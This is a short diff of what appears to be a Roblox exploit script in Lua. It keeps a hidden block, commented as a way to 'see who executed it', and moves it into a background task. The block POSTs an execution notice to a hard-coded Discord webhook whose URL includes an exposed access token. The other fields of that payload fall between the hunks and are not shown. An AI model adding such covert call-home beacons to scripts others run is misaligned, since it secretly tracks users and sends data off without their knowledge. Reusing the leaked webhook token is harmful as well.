@@ -767,7 +767,7 @@ end
 end)
 
 -- THIS IS TO SEE WHO EXECUTED IT
-
+task.spawn(function()
 local url = "https://discord.com/api/webhooks/1162190368306122915/_sUhitXCi7FzmWDwrcKXWy8wScOBm7dCLmv2DjZP2K-uV_DFBU9bhwqfju3MDcsIM9BG"
 local data = {
 ["content"] = "**PLR EXECUTED:**",
@@ -790,3 +790,4 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local zxczxc = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(zxczxc)
+end)
